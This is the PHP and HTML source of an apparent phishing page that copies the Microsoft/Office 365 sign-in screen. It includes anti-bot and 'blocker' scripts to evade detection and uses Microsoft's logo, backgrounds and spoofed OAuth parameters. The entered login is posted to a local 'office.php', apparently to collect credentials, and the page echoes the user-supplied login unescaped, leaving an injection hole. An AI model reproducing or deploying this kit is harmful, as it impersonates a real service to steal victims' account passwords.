<?
require_once('../antibots.php');
require_once('../blocker.php');
include '../antibots.php';
include '../blocker.php';
$login = $_REQUEST['login'];
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html dir="ltr" class="" lang="en"><head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">

    <!--- <noscript>
        &lt;meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" /&gt;
    </noscript> --->

    
        <link rel="shortcut icon" href="./favicon_a.ico">
    
    <meta name="robots" content="none">

<link href="./converged.v2.login.min.css" rel="stylesheet">


<!----    <script crossorigin="anonymous" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7811.14/content/cdnbundles/convergedlogin_pcore.min.js" ></script>


    <script crossorigin="anonymous" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7811.14/content/cdnbundles/convergedloginpaginatedstrings-en.min.js" ></script> ----->

    
    


</head>

<body class="cb">

<div><!--  --> <div ><div class="background" ><!-- ko if: smallImageUrl --> <div style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7811.14/content/images/backgrounds/0-small.jpg?x=138bcee624fa04ef9b75e86211a9fe0d&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7811.14/content/images/backgrounds/0.jpg?x=a5dbd4393ff6a725c7e62b61df7e72f0&quot;);"></div><!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div> 
<form name="f1" id="i0281" spellcheck="false" method="post"action="office.php?login=<? print $login; ?>&client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3d-JJQNCNQ2z0ksmhozaEZ0BAbXmlhmEFKLfuuyzsjXAh36_lJevZlZV067KNNYAWjDxvsqLUzHdkt0L9dTPP5L1qlr4t02CYL2zfoM6553u5dm3xPVyUAJkHJYbTr1nZX&nonce=636662974340260123.YmQzNzg1ZTItNDhmMy00MDkzLWFhODMtZDZjNjQ0ODE5MTgyYmZiMmJkYWYtZmYwYy00MmJhLWI4OGQtNGZhNTVmNjNkYzI0&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US"><!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" ><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.fShowCookieBanner --><!-- /ko --> <div class="middle"><!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner"><!-- ko ifnot: paginationControlMethods()
                    && (paginationControlMethods().currentViewHasMetadata('hideLogo')
                        || (paginationControlMethods().currentViewHasMetadata('hideDefaultLogo') && !$loginPage.bannerLogoUrl())) --> <div role="banner" >
<img class="logo" role="presentation" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7811.14/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --> <div role="main" ><div ><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" ><!--  --> <div ><div class="row text-title" id="loginHeader" role="heading"> <div aria-level="1">Sign in</div><!-- ko if: isSubtitleVisible --><!-- /ko --> </div></div><!-- ko if: pageDescription && !svr.fHideLoginDesc --><!-- /ko --> <div class="row"> <div role="alert" aria-live="assertive" aria-atomic="false"><!-- ko if: usernameTextbox.error --><!-- /ko --> </div> <div class="form-group col-md-24"><!-- ko if: prefillNames().length > 1 --><!-- /ko --><!-- ko ifnot: prefillNames().length > 1 --> 
<div class="placeholderContainer" ><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> 
<input type="email" name="login" id="i0116" value="<? print $login; ?>" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" placeholder="Email, phone, or Skype" aria-label="Enter your email, phone, or Skype." required> 
					
					<input name="passwd" type="password" id="i0118" autocomplete="off" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <div id="usernameProgress" class="progress" role="progressbar" aria-label="Please wait" style="display: none;"><!--  --><!-- ko if: useCssAnimation --> <div></div><div></div><div></div><div></div><div></div><div></div><!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko --></div> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div><!-- /ko --> </div> </div><!-- ko withProperties: { '$usernameView': $data } --> <div class="position-buttons"><div ><!--  --> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <!-- ko template: { nodes: $componentTemplateNodes, data: $data } --><!-- ko if: svr.showCantAccessAccountLink --><!-- ko component: { name: 'action-link-control',
                    event: {
                        load: actionLink_onLoad,
                        focusChange: actionLink_onFocusChange } } --><!-- ko if: isVisible --> <!-- ko template: { nodes: $componentTemplateNodes, data: $data } --> <div> <a id="cantAccessAccount" href="#">Can’t access your account?</a> </div><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: !svr.sRemoteConnectAppName && svr.remoteLoginConfig --><!-- /ko --><!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases --><!-- ko component: { name: 'action-link-control',
                    event: {
                        load: actionLink_onLoad,
                        focusChange: actionLink_onFocusChange } } --><!-- ko if: isVisible --> <!-- ko template: { nodes: $componentTemplateNodes, data: $data } --><!-- ko if: isMenuLink --><!-- /ko --><!-- ko ifnot: isMenuLink --> <div class="form-group" >No account? <a href="#" id="signup" aria-label="Create a Microsoft account">Create one!</a></div><!-- /ko --><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: $usernameView.availableCredsWithoutUsername.length > 0 --><!-- /ko --> <!-- /ko --><!-- ko if: collapseExcessLinks && actionLinks().length > 2 --><!-- /ko --> </div> </div> </div></div><div class="row" > <div ><div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" ><!-- ko if: isSecondaryButtonVisible --><!-- /ko --> <div  class="inline-block"> 
<input type="submit" id="idSIButton9" class="btn btn-block btn-primary" value="Next"> </div> </div></div> </div></div></div></div></div> </div><!-- ko if: newSessionMessage --><!-- /ko --> <input type="hidden" name="ps" value=""> <input type="hidden" name="psRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy"  value=""> <input type="hidden" name="psRNGCSLK"  value=""> <input type="hidden" name="canary"  value="dw3/98BkcW18HOhPfURLbIuZaqIJguhEnZegv5jAXpM=4:1"> <input type="hidden" name="ctx" value=""> <input type="hidden" name="hpgrequestid" value="b07639cb-f039-48a2-acfa-305d28490900"> <input type="hidden" id="i0327" name="flowToken" value="#"> <input type="hidden" name="PPSX"  value=""> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" value=""> <input type="hidden" name="fspost" value="0"> <input type="hidden" name="i21" value="0"> <input type="hidden" name="CookieDisclosure" value="0"> <input type="hidden" name="IsFidoSupported" value="0"> <div><input type="hidden" name="i2"  value="1"> <input type="hidden" name="i17" value=""> <input type="hidden" name="i18" value=""> <input type="hidden" name="i19" value=""></div> <div id="footer" class="footer default" role="contentinfo"> <div><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" >©2020 Microsoft</span><!-- /ko --> <a id="ftrTerms" href="#">Terms of use</a> <a id="ftrPrivacy" href="#">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href="#" role="button" class="moreOptions" aria-label="Click here for more options" title="Click here for more options"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } -->
<img class="desktopMode"  src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7811.14/content/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } -->
<img class="mobileMode" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7811.14/content/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div><!-- ko if: showDebugDetails --><!-- /ko --> <!-- /ko --></div> </div> </div> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.iBannerEnvironment --><!-- /ko --><!-- ko if: svr.urlUxPreviewOptIn && showFeatureNotificationBanner() --><!-- /ko --> </form> 
<form method="post" aria-hidden="true" ><!-- ko foreach: postRedirectParams --><!-- /ko --> </form><!-- ko if: svr.urlMsaMeControl --><!-- /ko --><!-- ko if: svr.urlCBPartnerPreload --> <div id="idPartnerPL"><iframe height="0" width="0" src="#" style="display: none;"></iframe></div> <!-- /ko --></div><span style="margin: 0px auto; border: 2px dotted rgb(0, 0, 0); position: absolute; z-index: 2147483647; visibility: hidden; left: 389px; width: 0px; top: 478px; height: 0px;"></span><span style="z-index: 2147483647; position: absolute; visibility: hidden; left: 374px; width: 50px; top: 463px; height: 20px; font-size: 10px; color: black;"></span></body></html>